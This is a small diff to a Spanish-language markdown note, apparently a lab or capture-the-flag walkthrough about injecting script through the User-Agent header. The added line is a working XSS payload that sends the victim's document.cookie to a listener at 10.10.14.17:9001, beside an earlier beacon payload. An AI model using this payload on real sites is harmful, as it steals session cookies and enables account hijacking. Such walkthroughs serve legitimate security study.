@@ -127,8 +127,10 @@ hacemos la misma inyección pero esta ves en el `User-Agent` y estaremos a la es
 <script>var i=new Image(); i.src="http://10.10.14.17:9001/XSS";</script>
 ```
 
-```p
+```python
+<script>var i=new Image(); i.src="http://10.10.14.17:9001/?cookie="+(document.cookie);</script>
 ```
+
 
 ![[Pasted image 20240611203622.png]]
 
